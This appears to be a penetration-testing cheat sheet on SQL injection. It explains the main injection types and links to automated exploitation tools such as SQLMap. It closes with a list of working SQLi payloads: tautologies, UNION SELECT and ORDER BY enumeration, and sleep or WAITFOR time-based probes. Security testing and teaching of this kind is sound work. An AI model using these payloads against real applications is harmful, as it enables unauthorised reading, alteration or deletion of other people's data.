#### SQL Injection

In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection. 

#### What is SQL injection (SQLi)?

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.


|    SQL Injection Type        | Description                     
|----------------|-------------------------------|
|In-band SQLi (Classic SQLi)|In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi. |    
|Error-based SQLi          |Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.| 
|Union-based SQLi         |Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.|
|Inferential SQLi (Blind SQLi)|Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.|
|Boolean-based (content-based) Blind SQLi |Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.|
|Time-based Blind SQLi |Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.|
|Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).|
| Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |

#### SQL Injection Vulnerability Scanner Tool's :

* [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatic SQL Injection And Database Takeover Tool

* [jSQL Injection](https://github.com/ron190/jsql-injection) – Java Tool For Automatic SQL Database Injection

* [BBQSQL](https://github.com/Neohapsis/bbqsql) – A Blind SQL-Injection Exploitation Tool

* [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automated NoSQL Database Pwnage

* [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – SQL Vulnerability Scanner

* [DSSS](https://github.com/stamparm/DSSS) – Damn Small SQLi Scanner

* [explo](https://github.com/dtag-dev-sec/explo) – Human And Machine Readable Web Vulnerability Testing Format

* [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Blind SQL-Injection via Bitshifting

* [Leviathan](https://github.com/leviathan-framework/leviathan) – Wide Range Mass Audit Toolkit

* [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)
#### Generic SQL Injection Payloads

```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator

@variable	local variable
@@variable	global variable


# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2


1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --


-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --


-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1	

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


Finding the table name


Time-Based:
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--

Comments:

#	    Hash comment
/*  	C-style comment
-- -	SQL comment
;%00	Nullbyte
`	    Backtick
```
